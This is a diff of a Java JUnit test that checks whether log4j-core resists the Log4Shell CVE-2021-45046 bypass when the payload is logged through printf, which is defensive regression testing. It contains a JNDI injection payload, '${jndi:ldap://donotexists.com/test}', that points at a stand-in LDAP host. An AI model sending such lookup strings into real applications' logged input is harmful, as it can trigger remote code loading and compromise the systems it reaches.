@@ -3,7 +3,6 @@ package eu.righettod;
 import org.apache.logging.log4j.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
-import org.apache.logging.log4j.ThreadContext;
 import org.apache.logging.log4j.core.appender.ConsoleAppender;
 import org.apache.logging.log4j.core.config.Configurator;
 import org.apache.logging.log4j.core.config.builder.api.AppenderComponentBuilder;
@@ -28,12 +27,12 @@ import java.util.concurrent.TimeUnit;
 
 /**
  * Test suite to ensure that the current version used of log4j-core is not exposed to log4shell vulnerability for CVE-2021-45046
- * with the "log4j2.formatMsgNoLookups=true" bypass.
+ * with the "log4j2.formatMsgNoLookups=true" bypass and using the "log.printf()" function.
  *
  * @see "https://www.studytonight.com/post/log4j2-programmatic-configuration-in-java-class"
  * @see "https://docs.oracle.com/javase/7/docs/technotes/guides/net/properties.html"
  */
-public class Log4ShellExposureTestFormatMsgNoLookupsBypass {
+public class Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf {
 
     private static final String TEST_PAYLOAD = "${jndi:ldap://donotexists.com/test}";
     private static final String TEST_FAILED_MARKER = "Error looking up JNDI resource";
@@ -65,7 +64,7 @@ public class Log4ShellExposureTestFormatMsgNoLookupsBypass {
         builder.setConfigurationName("DefaultLogger");
         AppenderComponentBuilder appenderBuilder = builder.newAppender("Console", "CONSOLE");
         appenderBuilder.addAttribute("target", ConsoleAppender.Target.SYSTEM_OUT);
-        appenderBuilder.add(builder.newLayout("PatternLayout").addAttribute("pattern", "${ctx:InsecureVariable} - %m%n"));
+        appenderBuilder.add(builder.newLayout("PatternLayout").addAttribute("pattern", "%m%n"));
         RootLoggerComponentBuilder rootLogger = builder.newRootLogger(Level.INFO);
         rootLogger.add(builder.newAppenderRef("Console"));
         builder.add(appenderBuilder);
@@ -102,17 +101,15 @@ public class Log4ShellExposureTestFormatMsgNoLookupsBypass {
         Assert.assertNotNull("Flag 'log4j2.formatMsgNoLookups' must be set!", System.getProperty("log4j2.formatMsgNoLookups"));
         Assert.assertTrue("Flag 'log4j2.formatMsgNoLookups' must be enabled!", Boolean.parseBoolean(System.getProperty("log4j2.formatMsgNoLookups")));
         //Log the payload
-        ThreadContext.put("InsecureVariable", TEST_PAYLOAD);
-        victim.info("Triggering...");
-        //victim.printf(Level.INFO,"%s",TEST_PAYLOAD);
+        victim.printf(Level.INFO, "%s", TEST_PAYLOAD);
         //Let's time to logger to write the content to the appender and any JNDI lookup to be attempted
         TimeUnit.SECONDS.sleep(10);
         //Check if any JNDI lookup tentative was performed
         String out = captureStream.toString(StandardCharsets.UTF_8);
         //Save the output for ease debugging operations
-        Files.deleteIfExists(Paths.get("target", "Log4ShellExposureTestMsgNoLookupsBypass.out"));
-        Files.writeString(Paths.get("target", "Log4ShellExposureTestMsgNoLookupsBypass.out"), out, StandardCharsets.UTF_8, StandardOpenOption.CREATE);
+        Files.deleteIfExists(Paths.get("target", "Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf.out"));
+        Files.writeString(Paths.get("target", "Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf.out"), out, StandardCharsets.UTF_8, StandardOpenOption.CREATE);
         //Apply assertion using the JNDI lookup marker
-        Assert.assertFalse("JNDI lookup tentative identified, see target/Log4ShellExposureTestMsgNoLookupsBypass.out file for details.", out.contains(TEST_FAILED_MARKER));
+        Assert.assertFalse("JNDI lookup tentative identified, see target/Log4ShellExposureTestFormatMsgNoLookupsBypassWithPrintf.out file for details.", out.contains(TEST_FAILED_MARKER));
     }
 }
